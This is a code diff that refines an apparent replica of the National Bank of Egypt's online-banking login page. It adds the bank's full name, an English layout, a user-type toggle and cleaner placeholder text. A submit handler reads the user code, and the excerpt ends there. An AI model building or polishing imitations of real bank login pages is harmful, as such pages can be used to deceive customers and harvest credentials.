@@ -3,13 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NBE - Login</title>
+    <title>National Bank of Egypt - Login</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link rel="stylesheet" href="login-theme.css">
     <style>
-        .form-control { text-align: left; }
-        .form-group { text-align: left; }
-        .forgot-link { text-align: left; }
+        /* Override for English LTR Header Layout */
+        .site-header { flex-direction: row; justify-content: space-between; }
+        .header-left { order: 1; flex-direction: row; }
+        .header-right { order: 2; }
+        .user-types { flex-direction: row; }
+        .form-group, .forgot-link, .form-control { text-align: left; }
+        .back-link { flex-direction: row; }
     </style>
 </head>
 <body>
@@ -34,17 +38,17 @@
         </div>
 
         <div class="user-types">
-            <div class="type-card">
-                <i class="fas fa-building"></i>
-                <span>Corporate</span>
-            </div>
-            <div class="type-card active">
+            <div class="type-card active" onclick="toggleUserType(this)">
                 <i class="far fa-user"></i>
                 <span>Individual</span>
             </div>
+            <div class="type-card" onclick="toggleUserType(this)">
+                <i class="fas fa-building"></i>
+                <span>Corporate</span>
+            </div>
         </div>
 
-        <div class="welcome-msg">Welcome, <span>lgguhfuughuy</span></div>
+        <div class="welcome-msg">Welcome, <span>Guest</span></div>
         <h1 class="page-heading">User Code</h1>
 
         <section class="login-card">
@@ -53,7 +57,7 @@
                 <div class="form-group">
                     <label class="form-label">User Code</label>
                     <div class="form-control-wrapper">
-                        <input type="text" id="username" name="username" class="form-control" placeholder="User Code" required autofocus>
+                        <input type="text" id="username" name="username" class="form-control" placeholder="Enter User Code" required autofocus>
                     </div>
                 </div>
                 <a href="#" class="forgot-link">Forgot User Code?</a>
@@ -70,6 +74,11 @@
 </main>
 
 <script>
+function toggleUserType(element) {
+    document.querySelectorAll('.type-card').forEach(card => card.classList.remove('active'));
+    element.classList.add('active');
+}
+
 document.getElementById('step1Form').addEventListener('submit', function(event) {
     event.preventDefault();
     const username = document.getElementById('username').value;
